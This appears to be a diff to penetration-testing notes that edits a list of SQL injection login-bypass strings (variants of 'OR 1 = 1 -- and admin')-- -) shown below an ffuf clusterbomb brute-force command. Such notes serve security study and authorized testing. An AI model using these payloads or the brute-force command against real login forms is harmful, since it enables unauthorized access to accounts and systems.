@@ -245,11 +245,10 @@ ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFU
 
 ```bash
 'OR 1 = 1 --
-Adminstrator'OR 1 = 1 --
-Admin'OR 1 = 1 -- 
-Admin ' or '1' = '1 #  
+'OR '1' = '1' --
+admin'OR 1 = 1 -- 
+admin ' or '1' = '1'  
 admin')-- -
-Admin')-- -
 ```
 
 ---
